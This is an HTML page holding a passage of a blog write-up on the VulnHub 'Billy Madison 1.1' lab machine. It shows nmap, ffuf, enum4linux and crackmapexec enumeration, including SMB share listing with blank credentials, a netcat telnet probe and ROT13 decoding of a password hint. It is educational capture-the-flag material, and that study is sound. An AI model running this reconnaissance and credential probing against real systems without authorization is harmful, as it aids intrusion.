@@ -1,0 +1,1035 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Vulnhub - Billy Madison 1.1" /><meta property="og:locale" content="en" /><meta name="description" content="Recon NMAP Complete Scan ``` ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34] └─# cat scans/_full_tcp_nmap.txt Nmap 7.92 scan initiated Mon Feb 22 21:34:23 2022 as: nmap -vv –reason -Pn -T4 -sV -sC –version-all -A –osscan-guess -p- -oN /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/xml/_full_tcp_nmap.xml 192.168.110.34 adjust_timeouts2: packet supposedly had rtt of -761685 microseconds. Ignoring time. adjust_timeouts2: packet supposedly had rtt of -761685 microseconds. Ignoring time. Nmap scan report for 192.168.110.34 Host is up, received arp-response (0.00042s latency). Scanned at 2022-02-21 21:34:38 +08 for 179s Not shown: 65526 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 22/tcp open tcpwrapped syn-ack ttl 64 |ssh-hostkey: ERROR: Script execution failed (use -d to debug) 23/tcp open tcpwrapped syn-ack ttl 64 69/tcp open caldav syn-ack ttl 64 Radicale calendar and contacts server (Python BaseHTTPServer) |_http-server-header: MadisonHotelsWordpress |_http-title: Welcome | Just another WordPress site | http-methods: | Supported Methods: HEAD GET POST OPTIONS |http-generator: WordPress 1.0 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Oh nooooooo! | http-methods: | Supported Methods: GET HEAD POST OPTIONS 137/tcp closed netbios-ns reset ttl 64 138/tcp closed netbios-dgm reset ttl 64 139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP) 2525/tcp open smtp syn-ack ttl 64 SubEtha smtpd | smtp-commands: BM, 8BITMIME, AUTH LOGIN, Ok |_ SubEthaSMTP null on BM Topics: HELP HELO RCPT MAIL DATA AUTH EHLO NOOP RSET VRFY QUIT STARTTLS For more info use “HELP &quot;. End of HELP info MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.10 - 4.11 TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=2/21%OT=69%CT=137%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=6 OS:21395A1%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=101%TI=Z%CI=I%TS=8)OPS OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1 OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T OS:5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A% OS:A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=N)" /><meta property="og:description" content="Recon NMAP Complete Scan ``` ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34] └─# cat scans/_full_tcp_nmap.txt Nmap 7.92 scan initiated Mon Feb 22 21:34:23 2022 as: nmap -vv –reason -Pn -T4 -sV -sC –version-all -A –osscan-guess -p- -oN /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/xml/_full_tcp_nmap.xml 192.168.110.34 adjust_timeouts2: packet supposedly had rtt of -761685 microseconds. Ignoring time. adjust_timeouts2: packet supposedly had rtt of -761685 microseconds. Ignoring time. Nmap scan report for 192.168.110.34 Host is up, received arp-response (0.00042s latency). Scanned at 2022-02-21 21:34:38 +08 for 179s Not shown: 65526 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 22/tcp open tcpwrapped syn-ack ttl 64 |ssh-hostkey: ERROR: Script execution failed (use -d to debug) 23/tcp open tcpwrapped syn-ack ttl 64 69/tcp open caldav syn-ack ttl 64 Radicale calendar and contacts server (Python BaseHTTPServer) |_http-server-header: MadisonHotelsWordpress |_http-title: Welcome | Just another WordPress site | http-methods: | Supported Methods: HEAD GET POST OPTIONS |http-generator: WordPress 1.0 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Oh nooooooo! | http-methods: | Supported Methods: GET HEAD POST OPTIONS 137/tcp closed netbios-ns reset ttl 64 138/tcp closed netbios-dgm reset ttl 64 139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP) 2525/tcp open smtp syn-ack ttl 64 SubEtha smtpd | smtp-commands: BM, 8BITMIME, AUTH LOGIN, Ok |_ SubEthaSMTP null on BM Topics: HELP HELO RCPT MAIL DATA AUTH EHLO NOOP RSET VRFY QUIT STARTTLS For more info use “HELP &quot;. End of HELP info MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.10 - 4.11 TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=2/21%OT=69%CT=137%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=6 OS:21395A1%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=101%TI=Z%CI=I%TS=8)OPS OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1 OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T OS:5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A% OS:A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=N)" /><link rel="canonical" href="https://yufongg.github.io/posts/Billy-Madison-1.1/" /><meta property="og:url" content="https://yufongg.github.io/posts/Billy-Madison-1.1/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-24T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Vulnhub - Billy Madison 1.1" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-02-24T00:00:00+08:00","description":"Recon NMAP Complete Scan ``` ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34] └─# cat scans/_full_tcp_nmap.txt Nmap 7.92 scan initiated Mon Feb 22 21:34:23 2022 as: nmap -vv –reason -Pn -T4 -sV -sC –version-all -A –osscan-guess -p- -oN /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/xml/_full_tcp_nmap.xml 192.168.110.34 adjust_timeouts2: packet supposedly had rtt of -761685 microseconds. Ignoring time. adjust_timeouts2: packet supposedly had rtt of -761685 microseconds. Ignoring time. Nmap scan report for 192.168.110.34 Host is up, received arp-response (0.00042s latency). Scanned at 2022-02-21 21:34:38 +08 for 179s Not shown: 65526 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 22/tcp open tcpwrapped syn-ack ttl 64 |ssh-hostkey: ERROR: Script execution failed (use -d to debug) 23/tcp open tcpwrapped syn-ack ttl 64 69/tcp open caldav syn-ack ttl 64 Radicale calendar and contacts server (Python BaseHTTPServer) |_http-server-header: MadisonHotelsWordpress |_http-title: Welcome | Just another WordPress site | http-methods: | Supported Methods: HEAD GET POST OPTIONS |http-generator: WordPress 1.0 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Oh nooooooo! | http-methods: | Supported Methods: GET HEAD POST OPTIONS 137/tcp closed netbios-ns reset ttl 64 138/tcp closed netbios-dgm reset ttl 64 139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP) 2525/tcp open smtp syn-ack ttl 64 SubEtha smtpd | smtp-commands: BM, 8BITMIME, AUTH LOGIN, Ok |_ SubEthaSMTP null on BM Topics: HELP HELO RCPT MAIL DATA AUTH EHLO NOOP RSET VRFY QUIT STARTTLS For more info use “HELP &quot;. End of HELP info MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.10 - 4.11 TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=2/21%OT=69%CT=137%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=6 OS:21395A1%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=101%TI=Z%CI=I%TS=8)OPS OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1 OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T OS:5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A% OS:A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=N)","headline":"Vulnhub - Billy Madison 1.1","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Billy-Madison-1.1/"},"url":"https://yufongg.github.io/posts/Billy-Madison-1.1/"}</script><title>Vulnhub - Billy Madison 1.1 | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Vulnhub - Billy Madison 1.1</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220224023846.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Vulnhub - Billy Madison 1.1</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1645632000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-02-24 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3347 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><h1 id="recon">Recon</h1><h2 id="nmap-complete-scan">NMAP Complete Scan <a href="#nmap-complete-scan" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34]
+└─# cat scans/_full_tcp_nmap.txt 
+# Nmap 7.92 scan initiated Mon Feb 22 21:34:23 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/xml/_full_tcp_nmap.xml 192.168.110.34
+adjust_timeouts2: packet supposedly had rtt of -761685 microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of -761685 microseconds.  Ignoring time.
+Nmap scan report for 192.168.110.34
+Host is up, received arp-response (0.00042s latency).
+Scanned at 2022-02-21 21:34:38 +08 for 179s
+Not shown: 65526 filtered tcp ports (no-response)
+PORT     STATE  SERVICE     REASON         VERSION
+22/tcp   open   tcpwrapped  syn-ack ttl 64
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+23/tcp   open   tcpwrapped  syn-ack ttl 64
+69/tcp   open   caldav      syn-ack ttl 64 Radicale calendar and contacts server (Python BaseHTTPServer)
+|_http-server-header: MadisonHotelsWordpress
+|_http-title: Welcome | Just another WordPress site
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-generator: WordPress 1.0
+80/tcp   open   http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Oh nooooooo!
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+137/tcp  closed netbios-ns  reset ttl 64
+138/tcp  closed netbios-dgm reset ttl 64
+139/tcp  open   netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open   netbios-ssn syn-ack ttl 64 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
+2525/tcp open   smtp        syn-ack ttl 64 SubEtha smtpd
+| smtp-commands: BM, 8BITMIME, AUTH LOGIN, Ok
+|_ SubEthaSMTP null on BM Topics: HELP HELO RCPT MAIL DATA AUTH EHLO NOOP RSET VRFY QUIT STARTTLS For more info use "HELP &lt;topic&gt;". End of HELP info
+MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.10 - 4.11
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=2/21%OT=69%CT=137%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=6
+OS:21395A1%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=101%TI=Z%CI=I%TS=8)OPS
+OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1
+OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F
+OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
+OS:5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A%
+OS:A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=N)
+
+Uptime guess: 0.001 days (since Mon Feb 21 21:36:20 2022)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=253 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: BM
+
+Host script results:
+|_clock-skew: mean: 9h59m58s, deviation: 3h27m51s, median: 7h59m57s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 42428/tcp): CLEAN (Timeout)
+|   Check 2 (port 15395/tcp): CLEAN (Timeout)
+|   Check 3 (port 36534/udp): CLEAN (Timeout)
+|   Check 4 (port 64576/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2022-02-21T21:36:58
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
+|   Computer name: bm
+|   NetBIOS computer name: BM\x00
+|   Domain name: \x00
+|   FQDN: bm
+|_  System time: 2022-02-21T15:36:56-06:00
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.42 ms 192.168.110.34
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Feb 21 21:37:37 2022 -- 1 IP address (1 host up) scanned in 194.04 seconds
+</pre></table></code></div></div><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ffuf">FFUF <a href="#ffuf" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1]
+└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.cgi,.log'
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.110.34/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .html .txt .php .cgi .log 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+index.php               [Status: 200, Size: 937, Words: 96, Lines: 25]
+manual                  [Status: 301, Size: 317, Words: 20, Lines: 10]
+:: Progress: [27690/27690] :: Job [1/1] :: 460 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">index.php</code></ul><h2 id="tcp139445-smb">TCP/139,445 (SMB) <a href="#tcp139445-smb" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="enum4linux">Enum4linux <a href="#enum4linux" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre> ----------------------------------------
+|    Shares via RPC on 192.168.110.34    |
+ ----------------------------------------
+[*] Enumerating shares
+[+] Found 2 share(s):
+EricsSecretStuff:
+  comment: ''
+  type: Disk
+IPC$:
+  comment: IPC Service (BM)
+  type: IPC
+[*] Testing share EricsSecretStuff
+[+] Mapping: OK, Listing: OK
+[*] Testing share IPC$
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">EricsSecretStuff</code></ul><h3 id="crackmapexec">Crackmapexec <a href="#crackmapexec" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
+└─# crackmapexec smb $ip -u ' ' -p ' ' --shares
+SMB         192.168.110.34  445    BM               [*] Windows 6.1 (name:BM) (domain:) (signing:False) (SMBv1:True)
+SMB         192.168.110.34  445    BM               [+] \ :  
+SMB         192.168.110.34  445    BM               [+] Enumerated shares
+SMB         192.168.110.34  445    BM               Share           Permissions     Remark
+SMB         192.168.110.34  445    BM               -----           -----------     ------
+SMB         192.168.110.34  445    BM               EricsSecretStuff READ            
+SMB         192.168.110.34  445    BM               IPC$                            IPC Service (BM)
+
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">EricsSecretStuff</code> - READ</ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp23-telnet---cryptography">TCP/23 (Telnet) - Cryptography <a href="#tcp23-telnet---cryptography" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Access telnet<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1]
+ └─# nc $ip 23 | tee telnet.txt
+	
+ ***** HAHAH! You're banned for a while, Billy Boy!  By the way, I caught you trying to hack my wifi - but the joke's on you! I don't use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!!!! *****
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">rkfpuzrahngvat</code><li><code class="language-plaintext highlighter-rouge">ROTten</code><ul><li><a href="https://en.wikipedia.org/wiki/ROT13">ROT</a> substitution cipher</ul></ul><li>Identify ciphertext <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220221230702.png" alt="" data-proofer-ignore><li>Decipher it<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
+ └─# echo rkfpuzrahngvat | rot13
+ exschmenuating
